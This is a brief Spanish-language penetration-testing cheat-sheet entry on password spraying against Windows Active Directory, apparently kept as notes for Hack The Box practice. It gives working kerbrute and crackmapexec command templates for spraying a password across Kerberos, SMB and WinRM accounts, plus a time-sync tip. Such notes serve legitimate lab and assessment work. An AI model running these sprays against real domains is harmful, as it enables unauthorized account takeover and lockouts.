
## DESCRIPTION

Una vez que tenemos un usuario y una contraseña es recomendable probar esa contraseña para otros usuarios y en distintos servicios.
En Windows se recomienda probar esa contraseña para otros usuarios en:
* Kerberos
* SMB
* WinRM
* RPC Client
* LDAP

#### Mas información
* [Password Spraying - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)

## EXPLOITATION

```
# Kerbrute
/kerbrute_linux_amd64 passwordspray -d <<DOMINIO>> [--dc <<IP DEL DOMINIO>> <<LISTA DE USUARIOS>> <<Contraseña>>

# SMB / WinRM

crackmapexec smb <<DC IP or CIDR range>> <<smb/winrm>> -u <<username file>> -p <<password file>> --no-bruteforce --continue-on-success
```

**!!NOTA IMPORTANTE!!**  Si falla el comando de KERBRUTE TRY y sync your attack machine time with the time of the domain controller because kerberos authentication requires that the times be synced:
-   `ntpdate <DC IP>`

## MACHINES

* Hack The Box: 
